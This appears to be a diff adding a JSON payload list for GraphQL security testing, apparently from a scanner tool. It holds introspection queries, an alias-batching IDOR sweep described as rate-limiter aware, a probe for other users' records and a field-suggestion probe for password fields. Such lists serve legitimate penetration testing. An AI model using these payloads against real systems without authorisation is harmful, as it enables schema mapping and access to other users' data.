@@ -1,0 +1,42 @@
+{
+  "class": "graphql",
+  "order": "bypass-first",
+  "note": "Introspection first, then alias-based brute (rate limiter aware), then field-suggestion and injection contexts.",
+  "payloads": [
+    {
+      "id": "graphql::01",
+      "vector": "{\"query\":\"{ __schema { types { name } } }\"}",
+      "note": "introspection enabled = full schema map"
+    },
+    {
+      "id": "graphql::02",
+      "vector": "{\"query\":\"{ __type(name: \\\"User\\\") { fields { name } } }\"}",
+      "note": "targeted type introspection"
+    },
+    {
+      "id": "graphql::03",
+      "vector": "{\"query\":\"{ a: user(id: 1) b: user(id: 2) { id } }\"}",
+      "note": "alias batching — IDOR sweep without N requests"
+    },
+    {
+      "id": "graphql::04",
+      "vector": "{\"query\":\"{ user(id: \\\"{PEER_ID}\\\") { id email } }\"}",
+      "note": "canary peer id — access control"
+    },
+    {
+      "id": "graphql::05",
+      "vector": "{\"query\":\"{ u(username: \\\"x\\\") { pass } }\"}",
+      "note": "field suggestion probe (did you mean password?)"
+    },
+    {
+      "id": "graphql::06",
+      "vector": "{\"query\":\"mutation { __typename }\"}",
+      "note": "mutation schema probe"
+    },
+    {
+      "id": "graphql::07",
+      "vector": "{\"query\":\"{ user(id: 1) @skip(if: true) { id } }\"}",
+      "note": "directive handling probe"
+    }
+  ]
+}
